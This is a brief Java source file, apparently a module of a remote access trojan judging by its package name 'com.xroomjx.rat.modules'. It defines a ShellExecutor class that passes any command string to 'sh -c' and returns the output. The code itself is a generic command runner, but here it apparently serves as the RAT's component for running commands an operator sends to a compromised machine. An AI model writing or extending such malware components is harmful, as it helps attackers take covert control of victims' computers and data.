package com.xroomjx.rat.modules;

import java.io.BufferedReader;
import java.io.InputStreamReader;

public class ShellExecutor {
    public static String exec(String command) {
        try {
            Process process = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            process.waitFor();
            return output.toString();
        } catch (Exception e) {
            return "error: " + e.getMessage();
        }
    }
}
